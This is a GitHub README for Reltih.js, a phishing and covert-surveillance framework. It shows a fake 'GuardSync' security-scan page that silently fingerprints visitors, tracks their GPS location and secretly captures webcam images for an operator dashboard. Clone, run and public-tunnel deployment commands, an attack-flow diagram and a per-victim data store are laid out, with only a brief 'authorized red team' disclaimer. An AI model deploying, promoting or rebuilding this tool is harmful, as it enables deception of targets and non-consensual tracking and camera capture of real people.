<div align="center">

![header](https://capsule-render.vercel.app/api?type=waving&height=300&color=gradient&text=Reltih.js&fontAlignY=42)

![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Flask](https://img.shields.io/badge/Flask-Waitress-000000?style=for-the-badge&logo=flask&logoColor=white)
![JavaScript](https://img.shields.io/badge/JavaScript-Payloads-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
![Status](https://img.shields.io/badge/Status-Active-34A853?style=for-the-badge)

</div>

---

## `$ Overview`

Reltih.js is a highly stealthy fingerprinting and reconnaissance framework designed for **authorized Red Team operations**. It deploys a persuasive "Zero-Trust Security" facade (GuardSync) to deceive targets, while covertly extracting deep browser telemetry, hardware specifications, live location data, and webcam captures before gaining internal access. 

> **This tool is strictly for educational purposes and authorized penetration testing only. Unauthorized use is illegal.**

---

## `$ Screenshots`

<div align="center">

### 🎣 GuardSync Phishing Facade

![Client Phishing Page / GuardSync](./target-phishing.png)

### 💻 Command Dashboard

![Dashboard Page](./dashboard-panel.png)

</div>

---

## `$ Tree Overview`

```
.
├── server.py                  # Main Flask backend API
├── engine.py                  # Risk Scoring and Bot Classification Engine
├── index.html                 # Decoy GuardSync phishing landing page
├── dashboard.html             # Real-time monitoring dashboard
├── fp/                        # Fingerprinting payload modules
│   ├── os.js                  # OS & Platform detection
│   ├── browser.js             # Browser brand, version & features
│   ├── murmur.js              # Canvas, WebGL, Audio & Font hashing
│   ├── timing.js              # Interaction & timing forensics
│   └── environment.js         # Hardware & Battery context
└── Database/                  # Auto-generated device intel storage
```

---

## `$ Features`

| Module | Description |
|--------|-------------|
| **Phishing Facade** | Convincing "GuardSync" Zero-Trust login simulation |
| **Deep Fingerprinting** | WebGL, Canvas, Audio, and Font hashing via `murmur.js` |
| **VM/Sandbox Detection** | Evaluates CPU cores, RAM, GPU renderer, and interaction anomalies |
| **Location Tracking** | Silent GPS and IP trailing with real-time accuracy mapping |
| **Covert Camera** | Stealth webcam image capture and base64 remote extraction |
| **Risk Scoring Engine** | Evaluates trust based on hardware context, returning low/high risk flags |
| **Live Dashboard** | Terminal-styled real-time device monitoring with session viewer |

---

## `$ Installation`

```bash
git clone https://github.com/iNarrow12/Reltih.js.git
cd Reltih.js
pip install flask waitress requests
```

---

## `$ Usage`

```bash
# Start the backend server (Waitress WSGI on port 5000)
python server.py
```

| URL | Description |
|-----|-------------|
| `http://localhost:5000/` | Target-facing GuardSync facade |
| `http://localhost:5000/dashboard` | Internal monitoring dashboard |

---

## `$ Exposing Publicly`

```bash
cloudflared tunnel --url http://localhost:5000
```

---

## `$ Attack Flow`

```
Target visits deceptive URL
      |
      v
Interacts with "GuardSync" Security Scan
      |
      v
Fingerprinting modules (fp/*) execute silently  <- IPs, Hardware, Hashes sent to server
      |
      v
Risk engine evaluates trust (VM / Bot / Sandbox)
      |
      v
Covert GPS and Camera payloads triggered        <- Location and Photos captured
      |
      v
Red Teamer views deep intelligence on Dashboard
```

---

## `$ Admin Dashboard`

| Feature | Description |
|---------|-------------|
| Live Devices | View all captured targets with their last seen status |
| Trust Analysis | Automatic `LOW RISK` / `HIGH RISK` scoring computed by the engine |
| Identity Overview | Exact OS, Browser, GPU, memory, and geographical IP profiling |
| Session Traces | Detailed JSON-formatted history of network interactions |
| Camera Viewer | Access remotely captured webcam screenshots from targets |

---

## `$ Logging`

All intelligence is securely stored inside the `Database/` directory per-device structure:

```
Database/
└── <DeviceID_Hex>/
    ├── meta.json                # Aggregate trust scores and hardware profile
    ├── sessions/                # Raw telemetry JSONs per interaction
    ├── locations/               # GPS tracking trails
    └── camshots/                # Captured target images (.png)
```

---

## `$ License`

MIT — For authorized security research, red teaming, and educational use only.

<div align="center">

![footer](https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12,20,24&height=100&section=footer)

</div>
